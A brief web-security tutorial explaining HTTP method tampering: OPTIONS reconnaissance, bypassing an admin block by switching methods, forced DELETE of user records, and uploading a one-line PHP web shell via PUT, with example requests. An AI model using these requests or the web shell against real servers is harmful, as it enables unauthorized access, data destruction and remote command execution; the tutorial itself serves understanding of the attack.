**HTTP Method Tampering** is a web attack where attackers manipulate HTTP methods (like `GET`, `POST`, `PUT`, or `DELETE`) to bypass security mechanisms or gain unauthorized access to resources. It exploits misconfigured servers or applications that don’t properly validate or restrict HTTP methods.

## HTTP Methods

- **GET**: Retrieves a resource without modifying it.  
- **POST**: Submits data to the server, often creating a resource.  
- **PUT**: Updates or creates a resource at a specified URL.  
- **DELETE**: Removes a specified resource.  
- **PATCH**: Partially updates a resource.  
- **HEAD**: Similar to GET but returns only headers.  
- **OPTIONS**: Describes the communication options for a resource.  
- **TRACE**: Echoes back the received request. 

## Using OPTIONS for Reconnaissance

The `OPTIONS` method can be used to discover which HTTP methods are allowed on a server. This helps attackers map out potential attack surfaces.

```ruby
OPTIONS / HTTP/1.1
Host: target.com
```
The server responds with something like:
```ruby
HTTP/1.1 200 OK  
Allow: GET, POST, PUT, DELETE, OPTIONS  
```
If dangerous methods like `PUT` or `DELETE` are enabled, they can be exploited to modify or delete resources.


### **Example Attack Scenarios:**

**Bypass Authentication with Method Switch**  
If an admin panel blocks `GET` requests but accepts `POST`, an attacker can switch methods to gain access:

```ruby
POST /admin HTTP/1.1
```

**Forced Resource Deletion**  
If the server allows `DELETE`, an attacker can erase resources:

```ruby
DELETE /users/123 HTTP/1.1
```

**Uploading Files with PUT**  
If `PUT` is enabled, attackers might upload malicious files or web shells:

```ruby
PUT /uploads/shell.php HTTP/1.1  
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
```
